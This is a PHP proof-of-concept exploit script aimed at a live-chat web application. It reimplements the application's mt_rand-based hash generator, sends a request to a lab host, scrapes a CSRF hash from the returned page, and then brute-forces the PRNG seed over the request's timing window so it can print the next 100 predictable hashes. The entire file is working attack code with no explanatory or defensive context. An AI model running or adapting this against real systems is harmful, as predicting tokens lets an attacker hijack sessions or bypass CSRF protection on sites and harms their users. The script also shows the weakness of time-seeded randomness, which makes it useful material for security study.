<?php

function BuildHash()
{
	return BuildHashBlock() . BuildHashBlock() . BuildHashBlock() . BuildHashBlock();
}

/**
 * Build a Unique Hash Block
 *
 * @author John Haugeland
 * @return string The Hash Block
 */
function BuildHashBlock()
{
	$Ch1to3 = mt_rand(0, 36 * 36 * 36) - 1;		// largest alphanum power that'll fit in the minimum guaranteed 16-bit range for mt_randmax()
	$Ch4to5 = mt_rand(0, 36 * 36) - 1;
	$Ch6to8 = hexdec(substr(uniqid(), -6)) % (36 * 36 * 36);  // only want the bottom two characters of entropy, but clip a large range to keep from much influencing probability

	return str_pad(base_convert($Ch1to3, 10, 36), 3, '0', STR_PAD_LEFT) . str_pad(base_convert($Ch4to5, 10, 36), 2, '0', STR_PAD_LEFT) . str_pad(base_convert($Ch6to8, 10, 36), 3, '0', STR_PAD_LEFT);
}


$base_url = 'http://172.16.122.131:8333';

list($usec_start, $start) = explode(' ', microtime());
file_get_contents($base_url . "/visitor/index.php?/LiveChat/VisitorUpdate/UpdateFootprint/_isFirstTime=0/_sessionID=1");
$end = time();

$response = file_get_contents($base_url);
preg_match('~name="_csrfhash" value="([^"]*)"~', $response, $matches);
$hash = $matches[1];
$check_part = substr($hash, 0, 5);

echo "Got hash $hash\n";

echo "Working from $start to $end\n";
for ($seconds = $start; $seconds <= $end; $seconds++) {
    for ($usec_counter = 0; $usec_counter < 1e6; $usec_counter++) {
        $usec = $usec_counter / 1e6 + $usec_start;
        echo "$usec\n";
        $seed = (float) $seconds + ((float) $usec * 100000);
        mt_srand($seed);
        mt_rand();
        for ($i = 0; $i < 4; $i++) {
            $attempt = BuildHash();
            if (substr($attempt, 0, 5) == $check_part) {
                echo "Seed is $seed\n";
                echo "Next hashes are:\n";
                for ($j = 0; $j < 100; $j++) {
                    echo BuildHash()."\n";
                }
            }
        }
    }
}
